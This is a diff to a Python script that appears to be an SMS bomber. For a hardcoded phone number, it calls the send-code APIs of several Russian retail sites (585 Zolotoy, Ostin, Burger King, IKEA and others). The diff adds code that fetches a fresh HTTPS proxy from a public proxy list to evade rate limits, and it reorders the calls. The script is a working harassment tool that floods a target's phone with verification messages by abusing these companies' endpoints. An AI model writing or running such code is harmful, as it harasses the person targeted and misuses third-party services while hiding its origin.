@@ -1,6 +1,14 @@
+import json
+
 import requests
 import time
 import random
+
+getProxy=requests.get("https://www.proxyscan.io/api/proxy?type=https")
+print(getProxy.json())
+ip=getProxy.json()[0]["Ip"]
+port=getProxy.json()[0]["Port"]
+
 
 
 
@@ -12,7 +20,8 @@ import random
 #print("Номер телефона " + phone)
 phone = '9991253348'
 ts = 1
-ipPort = "182.253.82.154:37242"
+ipPort = str(ip)+":"+str(port)
+print(ipPort)
 proxy = {"https": "https://" + ipPort}
 headers = {
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124",
@@ -82,10 +91,10 @@ def zolotoy585():
     zol=requests.post("https://www.585zolotoy.ru/api/sms/send_code/",headers=zolHeaders,proxies=proxy,json={"phone":zolPhone})
     print(zol.status_code,"Zolotoy 585")
 
-zolotoy585()
-ostin()
-burgerKing()
-ikea()
 pyaterka()
-aptekaru()
 karusel()
+aptekaru()
+ikea()
+burgerKing()
+ostin()
+zolotoy585()
